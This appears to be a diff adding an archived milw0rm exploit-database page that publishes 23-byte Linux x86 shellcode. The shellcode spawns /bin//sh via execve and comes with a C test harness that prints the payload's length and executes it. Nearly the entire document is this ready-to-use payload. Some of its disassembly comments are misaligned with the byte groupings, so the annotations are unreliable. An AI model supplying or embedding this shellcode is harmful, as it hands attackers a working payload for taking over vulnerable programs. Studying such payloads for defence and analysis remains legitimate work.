@@ -1,0 +1,24 @@
+<html><head><title>linux/x86 execve code 23 bytes</title></head><pre>/************************************************************
+* Linux 23 byte execve code. Greetz to preedator            *
+*                                          marcetam         *
+*                                      admin at marcetam.net   *
+*************************************************************/
+char linux[]=
+  &quot;\x99&quot;			/* cdq              */
+  &quot;\x52&quot;			/* push %edx        */
+  &quot;\x68\x2f\x2f\x73\x68&quot;	/* push $0x68732f2f */
+  &quot;\x68\x2f\x62\x69\x6e&quot;	/* push $0x6e69622f */
+  &quot;\x89\xe3&quot;			/* mov %esp,%ebx    */
+  &quot;\x52&quot;			/* push %edx        */
+  &quot;\x54&quot;			/* push %esp        */
+  &quot;\x54&quot;			/* push %esp        */
+  &quot;\x59\x6a&quot;			/* pop %ecx         */
+  &quot;\x0b\x58&quot;			/* push $0x0b       */
+  &quot;\xcd\x80&quot;;			/* int $0x80        */
+int main(){
+  void (*run)()=(void *)linux;
+  printf(&quot;%d bytes \n&quot;,strlen(linux));
+  run();
+}
+
+// milw0rm.com [2004-11-15]</pre></html>
